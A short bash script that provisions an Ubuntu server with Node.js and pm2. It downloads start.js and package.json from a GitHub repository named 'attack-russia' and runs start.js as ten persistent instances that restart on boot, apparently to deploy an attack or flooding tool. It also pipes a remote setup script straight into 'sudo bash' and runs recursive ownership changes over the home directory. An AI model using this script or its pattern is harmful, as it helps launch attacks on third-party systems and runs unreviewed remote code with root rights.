#!/usr/bin/env bash

# node
curl -sL https://deb.nodesource.com/setup_17.x | sudo bash -
sudo apt-get install -y nodejs build-essential
sudo npm install npm -g
sudo npm cache clean -f
sudo npm set registry https://registry.npmjs.org/
sudo npm i -g pm2

# download source code
curl https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/package.json --output package.json && sudo npm install
curl https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/start.js --output start.js

sudo chown ubuntu:ubuntu ~/.pm2/ -R
sudo chown ubuntu:ubuntu .
sudo chown ubuntu:ubuntu ~/ -R
sudo chown ubuntu:ubuntu /home/ubuntu/.pm2/rpc.sock /home/ubuntu/.pm2/pub.sock

# pm2 scripts
env PATH=$PATH:/usr/bin /usr/lib/node_modules/pm2/bin/pm2 startup systemd -u ubuntu --hp /home/ubuntu &&  pm2 start start.js -i 10 --watch &&  pm2 save

#permissions fix
sudo chown ubuntu:ubuntu ~/.pm2/ -R
sudo chown ubuntu:ubuntu .
sudo chown ubuntu:ubuntu ~/ -R
sudo chown ubuntu:ubuntu /home/ubuntu/.pm2/rpc.sock /home/ubuntu/.pm2/pub.sock
